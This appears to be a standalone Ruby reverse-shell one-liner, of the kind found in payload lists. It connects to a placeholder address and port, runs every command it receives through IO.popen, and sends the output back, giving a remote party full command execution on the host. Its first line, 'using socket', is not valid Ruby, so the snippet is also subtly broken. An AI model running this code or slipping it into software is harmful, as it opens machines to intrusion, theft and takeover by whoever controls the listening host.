using socket
c=TCPSocket.new("ipaddr","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
